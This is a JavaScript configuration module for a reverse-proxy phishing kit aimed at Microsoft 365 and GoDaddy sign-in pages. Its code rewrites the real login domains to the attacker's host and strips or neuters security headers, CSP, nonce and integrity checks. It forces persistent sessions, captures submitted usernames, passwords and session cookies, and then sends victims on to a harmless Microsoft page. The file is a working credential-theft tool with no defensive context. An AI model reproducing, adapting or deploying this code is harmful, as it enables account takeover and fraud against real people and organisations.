/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const { timeStamp } = require('console')
const path = require('path')
const url = require('url')
const fs = require('fs')


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/kmsi')
        || this.browserReq.url.startsWith('/common/SAS/EndAuth')
        ){
            return this.forceKeepSession()
        } else {
            return super.processRequest()
        }

    }

    forceKeepSession() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                let kJust
                cJust += ''
                const forceOption = /LoginOptions=\d/
                kJust = cJust.replace(forceOption, 'LoginOptions=1')

                // kJust = kJust.replace(/"LastPollStart":\d*,/, '')
                // kJust = kJust.replace(/"LastPollEnd":\d*,?/, '')

                console.log(kJust)

                this.proxyEndpoint.setHeader('content-length', kJust.length)
                this.proxyEndpoint.write(kJust)
                this.proxyEndpoint.end('')
                // this.proxyEndpoint.write(kJust)
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)

        }
    }


}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /sso.godaddy.com/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /sso.secureserver.net/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /secureserver.net/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /godaddy.com/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /img6.wsimg.com/igm,
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /img6.wsimg.com\/auth-assets\/([A-Za-z0-9]*)\/login-panel.js/igm,
                replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/$1/login-panel.js`,

            },
            {
                reg: /login.microsoftonline.com/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
            },
            {
                reg: /aadcdn.ms(ft|)auth.net/igm, // Google chrome on windows fix
                replacement: `${this.browserEndPoint.clientContext.hostname}/aadcdn.ms$1auth.net/~`,
            },

            {
                reg: /\+this.api_target\+"\."\+/igm,
                replacement: '+'

            },
            {
                reg: /API_HOST:a,/igm,
                replacement: "API_HOST:'godaddy.com',"

            },
            {
                reg: /e.self===e.top/igm,
                replacement: 'true'
            },
            {
                reg: /e\.self===e\.top/igm,
                replacement: 'true'
            },
            {
                reg: /_top/igm,
                replacement: ''
            },
            {
                reg: /target="_top"/igm,
                replacement: ''
            },
            {
                reg: /nonce/g,
                replacement: 'nononce',
            },
            {
                reg: /integrity/g,
                replacement: 'xintegrity',
            },
            {
                reg: /crossorigin/gm,
                replacement: "rickorigin",
            },
        ]
    }


    processResponse() {
        if (!this.browserEndPoint.headersSent) {
            this.browserEndPoint.removeHeader('X-Frame-Options')
            this.browserEndPoint.removeHeader('X-Content-Type-Options')
            this.browserEndPoint.removeHeader('X-Permitted-Cross-Domain-Policies')
            this.browserEndPoint.removeHeader('Cross-Origin-Embedder-Policy')
            this.browserEndPoint.removeHeader('Cross-Origin-Opener-Policy')
            this.browserEndPoint.removeHeader('Cross-Origin-Resource-Policy')
            this.browserEndPoint.removeHeader('X-XSS-Protection')
            this.browserEndPoint.removeHeader('X-DNS-Prefetch-Control')
            this.browserEndPoint.removeHeader('X-Frame-Options')

            this.browserEndPoint.setHeader("Content-Security-Policy", `default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; form-action * data: blob: 'unsafe-inline' 'unsafe-eval';  script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: filesystem: ; frame-ancestors 'self' * http://* https://* file://* about: javascript: data: blob: filesystem: ; object-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';`)

        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        if (this.proxyResp.req.path.startsWith('/kmsi')
        // || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
        || this.proxyResp.req.path.startsWith('/owa/prefetch.aspx')
        || this.proxyResp.req.path.startsWith('/webmanifest.json')
        || this.proxyResp.req.path.startsWith('/landingv2')
        // || this.proxyResp.req.path.startsWith('/common/reprocess')
        ){
            this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
            return this.browserEndPoint.end()
        }



        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }

                if (this.proxyResp.headers['content-type'] &&
                this.proxyResp.headers['content-type'].startsWith('application/json')) {
                    const JObjBody = JSON.parse(newMsgBody)
                    if (JObjBody.hasOwnProperty('Credentials')) {
                        const hostDomain = this.browserEndPoint.clientContext.hostname
                        const fedUrl = JObjBody.Credentials.FederationRedirectUrl
                        if (fedUrl) {
                            let newFedDomain
                            if (fedUrl.startsWith(`https://${hostDomain}`)) {
                                newFedDomain = 'sso.godaddy.com'
                            }
                            else {
                                const fedObj = new URL(fedUrl)

                                newFedDomain = fedObj.hostname
                            }

                            console.log('fed domain is ' + newFedDomain)

                            this.browserEndPoint.clientContext.currentDomain = newFedDomain
                            newMsgBody = newMsgBody.replace(newFedDomain, this.browserEndPoint.clientContext.hostname)
                        }
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        this.browserEndPoint.setHeader('location', '/ping/v5767687')

    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.url.includes("ConvergedLogin_PCore")) {
            const clientBuff = fs.readFileSync(path.join(__dirname, 'ConvergedLogin_PCore.js'))
            this.res.writeHead(200, {
                'Content-Length': Buffer.byteLength(clientBuff),
                'Content-Type': 'application/x-javascript'
            });
            return this.res.end(clientBuff.toString());
        }

        //TODO: needs update to this code
        if (this.req.url.startsWith('/redirect.cgi?ref=aHR0cHM6Ly93d3cub2ZmaWNlLmNvbS9sb2dpbiM=')) {
            this.req.url = configExport.START_PATH
            clientContext.currentDomain = 'login.microsoftonline.com'
            return super.superExecuteProxy(clientContext.currentDomain, clientContext)
        }

        if (this.req.url.startsWith('/?domain=')) {
            clientContext.currentDomain = 'sso.godaddy.com'
        }


        if (this.req.url.startsWith(`/${clientContext.hostname}`) 
        || this.req.url.startsWith('?domain=')) {
            clientContext.currentDomain = 'sso.godaddy.com'
            this.req.url = this.req.url.replace(clientContext.hostname, '')
            this.req.url = this.req.url.replace('/~:443/', '')
        }

        if (this.req.url.startsWith('/:443')) {
            this.req.url = this.req.url.slice(5)
        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`redirectToken: ${redirectToken.url}`)

            console.log(`redirectToken host: ${redirectToken.host}`)

            const redirectHost = redirectToken.obj.host

            if (redirectHost === 'sso.godaddy.com' 
            || redirectHost === 'sso.secureserver.net') {
                clientContext.currentDomain = redirectHost
            }

            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://outlook.com')
            }
        }


        return super.execute(clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.microsoftonline.com',

    SCHEME: 'office',

    AUTOGRAB_CODE: 'login_hint',


    START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',

    COOKIE_PATH: ['/common/reprocess', '/common/SAS/ProcessAuth', '/ping/v5767687'],

    EXIT_TRIGGER_PATH: ['/ping/v5767687'],

    EXIT_URL: 'https://privacy.microsoft.com/en-us/privacystatement',

    EXTRA_COMMANDS: [

        {
            path: '/auth-assets.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'img6.wsimg.com',
                persistent: false,
                },
        },
        {
            path: '/wrhs.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'img6.wsimg.com',
                persistent: false,
                },
        },
        {
            path: '/identity-static-assets.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'img6.wsimg.com',
                persistent: false,
                },
        },
        {
            path: '/ux-assets.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'img6.wsimg.com',
                persistent: false,
                },
        },

        {
            path: '/common/GetCredentialType.*',
            command: 'DONOT_SEND_INFO',
            command_args: {},
        },

    ],



    PRE_HANDLERS:[],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        officeEmail: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        officePassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        adfsUsername: {
            method: 'POST',
            params: ['UserName'],
            urls: '',
            hosts: [],
        },

        adfsPassword: {
            method: 'POST',
            params: ['Password'],
            urls: '',
            hosts: [],
        },


        godaddyUsername: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['sso.godaddy.com'],
        },

        godaddyPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['sso.godaddy.com'],
        },


        loginFmt: {
            method: 'POST',
            params: ['loginfmt'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },


    },


    EXTERNAL_FILTERS:
        [
        // 'login.live.com',
        'aadcdn.msftauth.net',
        'login.microsoftonline.com',
        'sso.godaddy.com',
        'godaddy.com',
        'img6.wsimg.com'
        ],


    //MODULE OPTIONS
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport
